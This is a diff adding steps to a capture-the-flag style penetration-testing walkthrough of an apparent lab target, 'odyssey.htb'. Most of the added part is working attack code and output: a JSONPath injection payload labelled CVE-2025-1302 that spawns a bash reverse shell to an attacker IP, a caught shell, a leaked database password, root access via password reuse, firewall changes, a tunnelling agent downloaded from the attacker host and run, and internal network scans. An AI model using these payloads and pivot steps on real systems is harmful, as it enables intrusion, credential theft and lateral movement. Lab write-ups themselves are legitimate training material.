@@ -1337,7 +1337,7 @@ MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
 
 **we will exploiting the unsafe default usage of `eval='safe'` mode**
 
-**so we send a post request on this endpoit**  /api/v1/aegis-mds/\_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery
+**so we send a post request on this endpoit  /api/v1/aegis-mds/\_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery**
 
 {% code overflow="wrap" %}
 ```
@@ -1379,9 +1379,158 @@ MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
 **CVE-2025-1302**
 
 {% code overflow="wrap" %}
-```
-// Some code
+```bash
+# On burp 
+
+{
+  "expr": "$..[?(p=\"console.log(this.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.92/9002 0>&1\\\"').toString())\";Ethan=''[['constructor']][['constructor']](p);Ethan())]",
+  "context": "metadata"
+}
+
+
+listener 9002
+# listening on [any] 9002 ...
+# connect to [10.10.14.92] from (UNKNOWN) [10.129.47.110] 61950
+# bash: cannot set terminal process group (1467): Inappropriate ioctl for device
+# bash: no job control in this shell
+webadmin@odyssey-web:~/aegis$
 ```
 {% endcode %}
 
-<br>
+{% code overflow="wrap" %}
+```bash
+cat db/sql.js
+
+const config = {
+  user: process.env.AEGIS_SQL_USER || 'odyssey_app',
+  password: process.env.AEGIS_SQL_PASS || 'opc0932k90%%lODFI93-++',
+  server: process.env.AEGIS_SQL_HOST || '172.16.0.11',
+  database: process.env.AEGIS_SQL_DB || 'aegis',
+  port: parseInt(process.env.AEGIS_SQL_PORT || '1433', 10),
+  connectionTimeout: 8000,
+  requestTimeout: 15000,
+  pool: { max: 10, min: 0, idleTimeoutMillis: 30000 },
+  options: {
+    encrypt: false,
+    trustServerCertificate: true,
+    enableArithAbort: true,
+  },
+};
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 7**</mark>
+
+**I am confused becasue we found earlier a creds also for the same hsot but different user however after searching this is a security implementation named "least privs" the audit has list privs**&#x20;
+
+**let's setup ligolo tunnel to access the DB**
+
+{% code overflow="wrap" %}
+```bash
+getent group sudo
+# sudo:x:27:webadmin
+
+sudo su
+id
+# uid=0(root) gid=0(root) groups=0(root)
+# i used the same password it works so now we can have ssh access because the SSH is running 
+tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
+nano ssh.key # on kali
+chmod 600 ssh.key
+ssh -i ssh.key root@10.129.47.110
+```
+{% endcode %}
+
+**it doesnt work i dont know why we cant ssh to target since its enabled and its running  we hit it the firewall block the ssh**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ufw status
+
+Status: active
+
+To                         Action      From
+--                         ------      ----
+Anywhere on lo             ALLOW       Anywhere
+3000/tcp                   ALLOW       Anywhere                   # AEGIS web app — only port reachable from outside
+Anywhere (v6) on lo        ALLOW       Anywhere (v6)
+3000/tcp (v6)              ALLOW       Anywhere (v6)              # AEGIS web app — only port reachable from outside
+
+```
+{% endcode %}
+
+**It allow just the 3000 port, am dump because i forget that in the first scan i receive hist the 3000 open**
+
+{% code overflow="wrap" %}
+```bash
+ufw allow 22/tcp
+ufw reload
+
+# but it doesnt work also 
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+cat /etc/hsots 
+
+172.16.0.10 dc01.odyssey.htb dc01
+172.16.0.11 odyssey-db.odyssey.htb odyssey-db
+
+# our host on 172.16.0.12 
+
+curl http://10.10.14.92:1234/agent -o agent
+chmod +x agent
+
+# On kali
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# On target
+nohup ./agent -connect 10.10.14.92:11601 -ignore-cert > /dev/null 2>&1 &
+
+# on ligolo sesesion
+session
+1 # hit enter 
+interface_create --name "ligolo"
+interface_add_route --name ligolo --route 172.16.0.0/24
+start --tun ligolo
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 8**</mark>&#x20;
+
+{% code overflow="wrap" %}
+```bash
+cat >> scope < EOF
+172.16.0.11
+172.16.0.10
+EOF
+sudo nmap --open -iL scope
+
+# Nmap scan report for 172.16.0.11
+1433/tcp open  ms-sql-s
+5985/tcp open  wsman
+
+# Nmap scan report for 172.16.0.10
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+2179/tcp open  vmrdp
+3000/tcp open  ppp
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+```
+{% endcode %}
